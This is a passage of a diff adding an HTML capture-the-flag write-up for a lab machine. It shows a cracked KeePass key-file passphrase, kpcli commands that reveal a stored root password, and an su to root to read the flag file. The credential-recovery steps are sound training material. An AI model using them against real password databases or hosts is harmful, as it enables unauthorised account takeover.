+                Use&nbsp;the&nbsp;"--show"&nbsp;option&nbsp;to&nbsp;display&nbsp;all&nbsp;of&nbsp;the&nbsp;cracked&nbsp;passwords&nbsp;reliably<br>
+                Session&nbsp;completed
+            </div>
+        </div><br>
+        <br>
+        One hash has been cracked! - <code>bullshit</code> - using <code>IMG_0547.JPG</code> as the key file.<br>
+        <br>
+        <a id="h2-14" name="h2-14"></a><strong></strong>
+        <h2><strong>13) kpcli - Retrieve root password</strong></h2><br>
+        <code>kpcli</code> can be used to open <code>MyPasswords.kbdx</code> via the command line.<br>
+        • <code>open &lt;file.kdb&gt; [&lt;file.key&gt;])</code> opens a password database.<br>
+        • <code>show -f &lt;entry number&gt;</code> displays and entry's password in plaintext (otherwise it prints it as red text on a red background)<br>
+        ◇ Alternatively, you can run <code>show &lt;entry number&gt;</code> and copy/paste the red block out to a text editor. The password will be pasted<br>
+        <br>
+            <div class="codebox">
+                root@city64:~/ctf/safe/user#&nbsp;apt&nbsp;install&nbsp;kpcli<br>
+                ...<br>
+                root@city64:~/ctf/safe/user#&nbsp;kpcli<br>
+                <br>
+                KeePass&nbsp;CLI&nbsp;(kpcli)&nbsp;v3.1&nbsp;is&nbsp;ready&nbsp;for&nbsp;operation.<br>
+                Type&nbsp;'help'&nbsp;for&nbsp;a&nbsp;description&nbsp;of&nbsp;available&nbsp;commands.<br>
+                Type&nbsp;'help&nbsp;&lt;command&gt;'&nbsp;for&nbsp;details&nbsp;on&nbsp;individual&nbsp;commands.<br>
+                <br>
+                kpcli:/&gt;&nbsp;help<br>
+                &nbsp;&nbsp;...<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;--&nbsp;Open&nbsp;a&nbsp;KeePass&nbsp;database&nbsp;file&nbsp;(open&nbsp;&lt;file.kdb&gt;&nbsp;[&lt;file.key&gt;])<br>
+                &nbsp;&nbsp;&nbsp;...<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;show&nbsp;--&nbsp;Show&nbsp;an&nbsp;entry:&nbsp;show&nbsp;[-f]&nbsp;[-a]&nbsp;&lt;entry&nbsp;path|entry&nbsp;number&gt;<br>
+                &nbsp;&nbsp;&nbsp;...<br>
+                <br>
+                kpcli:/&gt;&nbsp;open&nbsp;MyPasswords.kdbx&nbsp;IMG_0547.JPG<br>
+                Please&nbsp;provide&nbsp;the&nbsp;master&nbsp;password:&nbsp;*************************<br>
+                kpcli:/&gt;&nbsp;ls<br>
+                ===&nbsp;Groups&nbsp;===<br>
+                MyPasswords/<br>
+                kpcli:/&gt;&nbsp;cd&nbsp;MyPasswords<br>
+                kpcli:/MyPasswords&gt;&nbsp;ls<br>
+                ===&nbsp;Groups&nbsp;===<br>
+                eMail/<br>
+                General/<br>
+                Homebanking/<br>
+                Internet/<br>
+                Network/<br>
+                Recycle&nbsp;Bin/<br>
+                Windows/<br>
+                ===&nbsp;Entries&nbsp;===<br>
+                0.&nbsp;Root&nbsp;password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                kpcli:/MyPasswords&gt;&nbsp;show&nbsp;-f&nbsp;0<br>
+                <br>
+                Title:&nbsp;Root&nbsp;password<br>
+                Uname:&nbsp;root<br>
+                &nbsp;Pass:&nbsp;u3v2249dl9ptv465cogl3cnpo3fyhk<br>
+                &nbsp;&nbsp;URL:&nbsp;<br>
+                Notes:&nbsp;
+            </div>
+        </div><br>
+        <br>
+        Back on the <code>ssh</code> session, switch user to <code>root</code> and grab <code>root.txt</code>.<br>
+            <div class="codebox">
+                user@safe:~$&nbsp;su&nbsp;root<br>
+                Password:&nbsp;u3v2249dl9ptv465cogl3cnpo3fyhk<br>
+                root@safe:/home/user#&nbsp;cd&nbsp;~<br>
+                root@safe:~#&nbsp;cat&nbsp;root.txt<br>
+                d7af235eb1db9fa059d2b99a6d1d5453
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
